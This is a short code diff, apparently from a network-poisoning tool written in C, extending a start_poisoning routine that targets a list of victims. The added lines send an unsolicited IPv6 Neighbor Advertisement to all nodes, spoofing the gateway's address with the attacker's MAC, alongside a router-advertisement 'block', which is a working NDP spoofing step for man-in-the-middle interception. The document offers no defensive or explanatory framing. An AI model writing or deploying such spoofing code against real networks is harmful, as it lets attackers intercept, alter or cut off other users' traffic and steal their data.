@@ -107,7 +107,13 @@ void start_poisoning(struct Victim *victims, int victim_count,
     // 3. Block IPv6 (NDP Spoofing)
     if (gateway_ipv6_ll) {
       if (send_ndp_ra_block(sockfd, my_mac, gateway_ipv6_ll) == 0) {
-        printf("IPv6 Blocking RA sent.\n");
+        printf("IPv6 Blocking RA sent (High Priority).\n");
+      }
+      
+      // Send unsolicited Neighbor Advertisement to all nodes
+      unsigned char all_nodes_mac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
+      if (send_ndp_na_spoof(sockfd, all_nodes_mac, my_mac, gateway_ipv6_ll) == 0) {
+        printf("IPv6 Unsolicited NA sent (Override).\n");
       }
     }
 
